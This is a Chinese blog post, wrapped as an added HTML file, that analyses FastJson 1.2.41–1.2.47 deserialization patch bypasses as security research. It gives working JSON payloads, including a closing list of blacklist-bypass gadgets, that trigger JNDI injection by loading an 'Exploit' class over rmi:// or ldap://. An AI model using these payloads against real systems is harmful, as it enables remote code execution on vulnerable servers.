@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言前文「初识FastJson」曾分析了 FastJson 反序列化的起始版本 1.2.24, 本文将从修复补丁的 1.1.41版本开始分析如何bypass 补丁以及利用分析。 1.2.41根据该版本的补丁分析跟进到 DefaultJSONParser#parseObject中, 在291行处能看到调用了 ParserConfig#checkAutoType方法传入了 @key的值。  进入 ch">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FastJson 1.2.41 - 1.2.48分析">
+<meta property="og:url" content="http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Search is Null">
+<meta property="og:description" content="前言前文「初识FastJson」曾分析了 FastJson 反序列化的起始版本 1.2.24, 本文将从修复补丁的 1.1.41版本开始分析如何bypass 补丁以及利用分析。 1.2.41根据该版本的补丁分析跟进到 DefaultJSONParser#parseObject中, 在291行处能看到调用了 ParserConfig#checkAutoType方法传入了 @key的值。  进入 ch">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gri5ayuzv1j326k0la4ci.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gri5dbjz9dj326u0qwwyz.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gri5n8vqmqj31xi0u0qv5.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gri5r91683j326w0cwk6l.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gri76omkrcj31lq0u0e81.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1griyi2n6yoj325w0hw1a8.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1grizlztihej325s0iydsh.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1grizp63xq1j326e0l2tm7.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1grizx8raaaj61j70u07wh02.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1grizynfwytj326o0netjg.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1grj03nk8h8j326u0e8n6n.jpg">
+<meta property="article:published_time" content="2021-06-15T10:02:54.000Z">
+<meta property="article:modified_time" content="2021-06-15T10:03:36.676Z">
+<meta property="article:author" content="Search?&#x3D;Null">
+<meta property="article:tag" content="FastJson">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gri5ayuzv1j326k0la4ci.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>FastJson 1.2.41 - 1.2.48分析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Search is Null" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/exp1orer" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2021/06/14/JNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/&text=FastJson 1.2.41 - 1.2.48分析" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/&title=FastJson 1.2.41 - 1.2.48分析" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/&is_video=false&description=FastJson 1.2.41 - 1.2.48分析" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=FastJson 1.2.41 - 1.2.48分析&body=Check out this article: http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/&title=FastJson 1.2.41 - 1.2.48分析" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/&title=FastJson 1.2.41 - 1.2.48分析" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/&title=FastJson 1.2.41 - 1.2.48分析" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/&title=FastJson 1.2.41 - 1.2.48分析" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/&name=FastJson 1.2.41 - 1.2.48分析&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/&t=FastJson 1.2.41 - 1.2.48分析" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-41"><span class="toc-number">2.</span> <span class="toc-text">1.2.41</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-42"><span class="toc-number">3.</span> <span class="toc-text">1.2.42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-45"><span class="toc-number">4.</span> <span class="toc-text">1.2.45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-47"><span class="toc-number">5.</span> <span class="toc-text">1.2.47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他黑名单绕过"><span class="toc-number">6.</span> <span class="toc-text">其他黑名单绕过</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        FastJson 1.2.41 - 1.2.48分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Search is Null</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-06-15T10:02:54.000Z" itemprop="datePublished">2021-06-15</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/FastJson/" rel="tag">FastJson</a>, <a class="tag-link" href="/tags/Java/" rel="tag">Java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前文「<a href="https://exp1orer.github.io/2021/03/08/%E5%88%9D%E8%AF%86FastJson/" target="_blank" rel="noopener">初识FastJson</a>」曾分析了 <code>FastJson</code> 反序列化的起始版本 <code>1.2.24</code>, 本文将从修复补丁的 <code>1.1.41</code>版本开始分析如何bypass 补丁以及利用分析。</p>
+<h3 id="1-2-41"><a href="#1-2-41" class="headerlink" title="1.2.41"></a>1.2.41</h3><p>根据该版本的补丁分析跟进到 <strong>DefaultJSONParser#parseObject</strong>中, 在291行处能看到调用了 <strong>ParserConfig#checkAutoType</strong>方法传入了 <code>@key</code>的值。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gri5ayuzv1j326k0la4ci.jpg" alt="image-20210614220518704"></p>
+<p>进入 <strong>checkAutoType</strong> 之后因为 <code>1.2.41</code> 版本默认已经不开启 <code>AutoType</code> 功能了 且此处 <code>expectClass</code>为null所以不会进入if分支中。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gri5dbjz9dj326u0qwwyz.jpg" alt="image-20210614220734251"></p>
+<p>代码走到836的分支中, 通过for循环如果 <code>@type</code> 的value是以黑名单的类名开头的话则会抛出异常, <code>denyList</code>有23个黑名单类, 其中包含了不少常见的gadget。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gri5n8vqmqj31xi0u0qv5.jpg" alt="image-20210614221705853"></p>
+<p>在循环完黑名单之后会调用 <strong>TypeUtils#loadClass</strong>去加载类, 而补丁的饶过也正在这个方法中：</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gri5r91683j326w0cwk6l.jpg" alt="image-20210614222058092"></p>
+<p>没什么好说的, <code>className</code> 以 <code>L</code> 开头及 <code>;</code>结尾则从截断第一个字符和最后一个字符, 也就是去除了 <code>L</code> 和 <code>;</code>, 然后加载类, 最后调用 <strong>JdbcRowSetImpl#connect</strong>触发JNDI注入。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gri76omkrcj31lq0u0e81.jpg" alt="image-20210614231023418"></p>
+<h3 id="1-2-42"><a href="#1-2-42" class="headerlink" title="1.2.42"></a>1.2.42</h3><p>新的补丁将黑名单类转变通过比较 <code>hash</code>判断, 并在 <code>checkAutoType</code>中判断类名如果以 <code>L</code> 开头及 <code>;</code>结尾则会去除：</p>
+<p>![image-20210615144033206](/Users/p1g3/Library/Application Support/typora-user-images/image-20210615144033206.png)</p>
+<p>经过 <code>checkAutoType</code> 后payload就会去除 一个<code>L</code> 和 <code>;</code>, 变成了 <code>Lcom.sun.rowset.JdbcRowSetImpl;</code>了。而在 <strong>TypeUtils#loadClass</strong>中会判断 <code>L</code> 和 <code>;</code>去除之后重新调用 loadClass。所以实际上这里使用多个 <code>L</code> 和 <code>;</code>效果是一样的, 都能够绕过 <code>checkAutoType</code>时的判断而在 <strong>loadClass</strong> 时又能正常加载类。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1griyi2n6yoj325w0hw1a8.jpg" alt="image-20210615145530522"></p>
+<h3 id="1-2-45"><a href="#1-2-45" class="headerlink" title="1.2.45"></a>1.2.45</h3><p>黑名单类绕过, 需要有Mybatis。</p>
+<blockquote>
+<p>{“@type”:”org.apache.ibatis.datasource.jndi.JndiDataSourceFactory”,”properties”:{“data_source”:”rmi://localhost:1099/Exploit”}}</p>
+</blockquote>
+<h3 id="1-2-47"><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h3><p>使用 <code>java.lang.Class</code> 白名单类绕过验证, 在 <strong>MiscCodec#deserialze</strong>方法通过层层筛选最终会加载 <code>val</code>键的值作为类名使用 <strong>TypeUtils#loadClass</strong> 加载类。</p>
+<p>经过 <code>checkAutoType</code>时由于 <code>@type</code> 的值是 <strong>java.lang.Class</strong>不存在黑名单中, 代码会走到833行中在白名单中寻找类, 白名单中存在该类会直接return。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grizlztihej325s0iydsh.jpg" alt="image-20210615153353002"></p>
+<p>回到 <strong>DefaultJSONParser#parseObject</strong>调用 <strong>ParserConfig#getDeserialzer</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grizp63xq1j326e0l2tm7.jpg" alt="image-20210615153655767"></p>
+<p>返回一个<strong>MiscCodec</strong> 对象。</p>
+<p>![image-20210615153958527](/Users/p1g3/Library/Application Support/typora-user-images/image-20210615153958527.png)</p>
+<p>回到 <strong>parseObject</strong> 继续调用 <strong>MiscCodec#deserialze</strong>, 通过 <strong>TypeUtils#loadClass</strong>加载类。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grizx8raaaj61j70u07wh02.jpg" alt="image-20210615154441134"></p>
+<p>这里strVal的值必须是 <code>val</code>键, 否则会抛出异常。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grizynfwytj326o0netjg.jpg" alt="image-20210615154603145"></p>
+<p>在 <strong>loadClass</strong>时会调用该重载方法, 且 <code>cache</code>参数默认为true, 导致将恶意类 <code>com.sun.rowset.JdbcRowSetImpl</code>类写入 <code>mappings</code>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">        <span class="keyword">return</span> loadClass(className, classLoader, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grj03nk8h8j326u0e8n6n.jpg" alt="image-20210615155051465"></p>
+<p>完整Payload</p>
+<blockquote>
+<p>{“a”: {“@type”: “java.lang.Class”, “val”: “com.sun.rowset.JdbcRowSetImpl”}, “b”: {“@type”: “com.sun.rowset.JdbcRowSetImpl”, “dataSourceName”: “ldap://x.x.x.x:1999/Exploit”, “autoCommit”: true}}</p>
+</blockquote>
+<h3 id="其他黑名单绕过"><a href="#其他黑名单绕过" class="headerlink" title="其他黑名单绕过"></a>其他黑名单绕过</h3><blockquote>
+<p>{“@type”:”org.apache.xbean.propertyeditor.JndiConverter”,”AsText”:”rmi://127.0.0.1:1099/Exploit”}”</p>
+<p>{“@type”:”org.apache.shiro.jndi.JndiObjectFactory”,”resourceName”:”rmi://127.0.0.1:1099/Exploit”}</p>
+<p>{“@type”:”br.com.anteros.dbcp.AnterosDBCPConfig”,”metricRegistry”:”rmi://127.0.0.1:1099/Exploit”}</p>
+<p>{“@type”:”org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup”,”jndiNames”:”rmi://127.0.0.1:1099/Exploit”}</p>
+<p>{“@type”:”com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig”,”properties”: {“@type”:”java.util.Properties”,”UserTransaction”:”rmi://127.0.0.1:1099/Exploit”}}</p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/exp1orer" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-41"><span class="toc-number">2.</span> <span class="toc-text">1.2.41</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-42"><span class="toc-number">3.</span> <span class="toc-text">1.2.42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-45"><span class="toc-number">4.</span> <span class="toc-text">1.2.45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-47"><span class="toc-number">5.</span> <span class="toc-text">1.2.47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他黑名单绕过"><span class="toc-number">6.</span> <span class="toc-text">其他黑名单绕过</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/&text=FastJson 1.2.41 - 1.2.48分析" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/&title=FastJson 1.2.41 - 1.2.48分析" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/&is_video=false&description=FastJson 1.2.41 - 1.2.48分析" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=FastJson 1.2.41 - 1.2.48分析&body=Check out this article: http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/&title=FastJson 1.2.41 - 1.2.48分析" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/&title=FastJson 1.2.41 - 1.2.48分析" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/&title=FastJson 1.2.41 - 1.2.48分析" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/&title=FastJson 1.2.41 - 1.2.48分析" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/&name=FastJson 1.2.41 - 1.2.48分析&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/06/15/FastJson-1-2-41-1-2-48%E5%88%86%E6%9E%90/&t=FastJson 1.2.41 - 1.2.48分析" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Search?=Null
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/exp1orer" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
